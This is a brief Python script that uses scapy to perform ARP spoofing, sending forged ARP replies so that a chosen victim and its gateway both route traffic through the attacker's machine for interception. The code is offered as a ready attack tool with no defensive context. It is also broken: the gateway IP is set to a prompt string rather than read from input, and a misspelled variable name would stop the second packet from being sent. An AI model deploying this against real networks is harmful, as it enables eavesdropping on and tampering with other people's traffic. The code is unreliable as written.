import os
from scapy.all import *

victim_ip = input("Victim IP: ")
victim_mac = input("Victim MAC: ")
mymac = input("Your MAC: ")
gateway_ip = ("Gateway IP: ")

# tell victim you are the gateway
send (ARP(op=ARP.is_at, psrc=gateway_ip, pdst=victim_ip, hwsrc=mymac, hwdst=victim_mac))

# tell gateway I am the target machine
send (ARP(op=ARP.is_at, psrc=victim_ip, pdst=gatewy_ip, hwsrc=mymac))




